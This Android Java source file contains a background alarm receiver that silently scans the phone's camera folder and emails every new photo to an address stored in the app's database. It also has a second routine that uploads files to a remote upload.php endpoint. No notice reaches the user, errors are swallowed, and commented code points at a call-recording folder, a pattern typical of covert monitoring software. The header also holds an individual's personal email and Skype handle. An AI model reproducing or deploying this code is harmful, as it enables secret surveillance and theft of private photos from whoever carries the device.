package voluntaty.com.base;


import android.app.Activity;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;
import android.util.TypedValue;
import android.widget.TextView;
import android.widget.Toast;

import com.gmail.GMail;
import com.voluntary.database.DataHelper;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
/* e-mail: superslon74@gmail.com
 * skype: superslon74
 * шаманский геннадий александрович
 */

public class RepeatingAlarmServicePhotoOne extends BroadcastReceiver {


    private DataHelper dh;

    String login=null;
    String email=null;
    String password=null;
    String URL_HTTP=null;
    ArrayList<Integer> list=null;
    String EMAIL=null;

    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }

    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {
            someTask(context);
        }
    }


    void someTask(Context context) {

        dh = null;
        dh = new DataHelper(context);

        String servicephoto;
        servicephoto = null;

        servicephoto = dh.selectServicephoto("1");
        dh = null;
        if(servicephoto.length()>0) {
    //    Toast.makeText(context, "", Toast.LENGTH_LONG).show();
        File sdPath = Environment.getExternalStorageDirectory();
          sdPath = new File(sdPath.getAbsolutePath() + "/DCIM/Camera");

      //      sdPath = new File(sdPath.getAbsolutePath() + "/callrecorder");

            ///callrecorder/



            String filename = null;
            //---------------------------------------------------------------------------------------
            if (sdPath.exists()) {
                File[] images = sdPath.listFiles();
                for (int i = 0; i < images.length; i++) {
                    String strt = null;
                    strt = "" + images[i];
                    String[] s = strt.split("/");
                    int dlina = s.length;
                    strt = null;
                    filename = s[dlina - 1];
                    //   Toast.makeText(getApplicationContext(),"!"+filename+"!", Toast.LENGTH_LONG).show();

                    String[] s2 = filename.split("\\.");
                    if (s2[1].equals("mp4")) {
                        //  		  Toast.makeText(getApplicationContext()," mp4 "+s2[1], Toast.LENGTH_LONG).show();

                    } else {
                        String namefotofile = null;
                        dh = null;
                        dh = new DataHelper(context);
                        email = dh.selectEmail();
                        password =dh.selectPassword();


                        URL_HTTP = dh.selectUrl_Http();
                        namefotofile = dh.selectFileName(filename);
                        int dlinafoto = namefotofile.length();
                        //    		  Toast.makeText(getApplicationContext()," else "+s2[1], Toast.LENGTH_LONG).show();
                        if (dlinafoto < 1) {
                  //          new SendFile().execute("" + sdPath, filename, URL_HTTP, email);

//  new SendMailTask().execute("" + sdPath, filename, URL_HTTP, email);


                            List<String> toEmailList = Arrays.asList(email.split("\\s*,\\s*"));

                         new SendMailTask().execute(email,password, toEmailList, "photo email", "photo","",filename);

       //                (String fromEmail, String fromPassword,List<String> toEmailList, String emailSubject, String emailBody,String pathname,String filename)


                            dh.insertFileName(filename);
                        }
                        dh = null;
                        namefotofile = null;


            /*		  URL_HTTP=dh.selectUrl_Http();

            		    //      URL url = new URL("http://superslon74.esy.es/resident/upload.php");
            		    //   	URL url = new URL("http://voluntaty.esy.es/user_superslon74@gmail.com/foto/upload.php");
            		    //   	 URL url = new URL("http://voluntaty.esy.es/user_superslon74_gmail_com/upload.php");
          *//*  		       	 String emailmodify=null;
            		       	emailmodify=email.replaceAll("\\.", "_");
            		       	emailmodify=emailmodify.replaceAll("@", "_");
    		  Toast.makeText(getApplicationContext()," !"+URL_HTTP+"/"+emailmodify+"/foto/upload.php", Toast.LENGTH_LONG).show();
         */    //	       	 URL url = new URL(URL_HTTP+"/"+emailmodify+"/foto/upload.php");

        /*
	      String emailmodify=null;
	       	emailmodify=email.replaceAll("\\.", "_");
	       	emailmodify=emailmodify.replaceAll("@", "_");

	       	 URL url = new URL(URL_HTTP+"/"+emailmodify+"/foto/upload.php");
	  */

                    }

                    filename = null;
                }


            }

       }

        servicephoto = null;


                                   }





    public class SendMailTask extends AsyncTask {


       @Override
        protected Object doInBackground(Object... args) {
            try {
               GMail androidEmail = new GMail(args[0].toString(),args[1].toString(), (List) args[2], args[3].toString(),args[4].toString(),args[5].toString(),args[6].toString());
                     androidEmail.createEmailMessage();
                     androidEmail.sendEmail();
                  } catch (Exception e) {
                                        }
            return null;
        }

        protected void onPostExecute(String result) {
            super.onPostExecute(result);
            //	Toast.makeText(getApplicationContext()," ????? "+ str2, Toast.LENGTH_LONG).show();

        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }

    }



    public class SendFile extends AsyncTask<String, String, String> {

        private String str2=null;
        HttpURLConnection conn;

        @Override
        protected String doInBackground(String... params)
        {

            str2=params[1];
            String lineEnd = "\r\n";
            String twoHyphens = "--";
            String boundary = "*****";
            try {



                //      URL url = new URL("http://superslon74.esy.es/resident/upload.php");
                //   	URL url = new URL("http://voluntaty.esy.es/user_superslon74@gmail.com/foto/upload.php");
                //   	 URL url = new URL("http://voluntaty.esy.es/user_superslon74_gmail_com/upload.php");
                String emailmodify=null;
                emailmodify=params[3].replaceAll("\\.", "_");
                emailmodify=emailmodify.replaceAll("@", "_");

                URL url = new URL(params[2]+"/user_"+emailmodify+"/foto/upload.php");

                conn = (HttpURLConnection) url.openConnection();
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type","multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                TypedValue value = new TypedValue();
                //  activity.getResources().getValue(params[0], value, true);
                dos.writeBytes("Content-Disposition: post-data; name=fileToUpload;filename=" + params[1] + "" + lineEnd);
                dos.writeBytes(lineEnd);


                File sdFile = new File(params[0],params[1]);
                InputStream inputStream = new FileInputStream(sdFile);

                //   InputStream inputStream = activity.getResources().openRawResource(params[0]);
                int bytesAvailable = inputStream.available();
                int maxBufferSize = 1000;
                byte[] buffer = new byte[bytesAvailable];

                int bytesRead = inputStream.read(buffer, 0, bytesAvailable);

                while (bytesRead > 0) {
                    dos.write(buffer, 0, bytesAvailable);
                    bytesAvailable = inputStream.available();
                    bytesAvailable = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = inputStream.read(buffer, 0, bytesAvailable);
                }

                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                inputStream.close();
                dos.flush();
                dos.close();
            }
            catch (Exception ex) {
                //    return false;
            }


            try {
                BufferedInputStream responseStream = new BufferedInputStream(conn.getInputStream());
                BufferedReader responseStreamReader = new BufferedReader(new InputStreamReader(responseStream));
                String line = "";
                StringBuilder stringBuilder = new StringBuilder();
                while ((line = responseStreamReader.readLine()) != null)
                {
                    stringBuilder.append(line).append("\n");
                }
                responseStreamReader.close();

                String response = stringBuilder.toString();
                conn.disconnect();
                //     return response.equals(activity.getString(R.string.serverOk)) ? true : false;

            } catch (Exception ex) {
                //return false;
            }

            return null;
        }


        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
            //	Toast.makeText(getApplicationContext()," ????? "+ str2, Toast.LENGTH_LONG).show();

        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }


    }




}
